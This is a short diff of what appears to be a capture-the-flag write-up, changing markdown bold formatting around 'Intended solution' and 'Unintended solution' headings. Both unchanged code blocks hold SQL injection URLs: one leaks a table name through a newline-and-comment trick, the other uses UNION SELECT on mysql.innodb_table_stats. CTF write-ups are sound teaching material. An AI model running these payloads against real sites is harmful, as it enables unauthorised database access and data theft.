@@ -82,13 +82,13 @@
 
   ​
 
-  ** Intended solution **
+  **Intended solution**
 
   ```
   table name leak : http://url/index.php?act=board&mid=search&col=title%23&type=1&search=%0a)^(id=1)-~1%23
   ```
 
-  ** Unintended solution **
+  **Unintended solution**
 
   ```
   http://url/index.php?act=board&mid=search&col=title%23&type=1&search=test%0a)%3C0%20union%20select%201,(select%20table_name%20from%20mysql.innodb_table_stats%20limit%202,1),3,4,5%23
